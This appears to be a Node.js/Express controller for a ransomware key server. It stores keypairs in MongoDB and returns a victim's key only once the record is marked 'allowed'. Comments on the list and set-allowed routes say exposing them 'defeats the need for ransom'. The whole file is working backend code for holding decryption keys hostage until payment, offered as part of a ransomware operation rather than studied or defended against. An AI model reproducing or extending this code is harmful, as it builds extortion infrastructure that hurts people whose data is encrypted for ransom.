'use strict';


var mongoose = require('mongoose'),
  Keypair = mongoose.model('Keypairs');


// Only for debug; defeats the need for ransom if it's public
exports.list_all_keypairs = function(req, res) {
  Keypair.find({}, function(err, keypair) {
    if (err)
      res.send(err);
    res.json(keypair);
  });
};


exports.create_a_keypair = function(req, res) {
  var new_keypair = new Keypair(req.body);
  new_keypair.save(function(err, keypair) {
    if (err)
      res.send(err);
    res.json(keypair);
  });
};


exports.read_a_keypair = function(req, res) {
  console.log(req.params)

  Keypair.find({pubkey : req.params.pubkey}, function(err, keypairs) {
    console.log(err)
    console.log(keypairs)
    if (err)
      res.send(err);
    
    // Only allow keys that are marked as allowed
    console.log(keypairs[0].allowed)
    res.json(
      keypairs.filter(keypair => keypair.allowed == 'true')
    );

  });
};

// Only for debug; defeats the need for ransom if it's public
exports.set_keypair_allowed = function(req, res) {
  Keypair.findOneAndUpdate({pubkey: req.params.pubkey}, {allowed: true}, {new: true}, function(err, task) {
    if (err)
      res.send(err);
    res.json(task);
  });
};

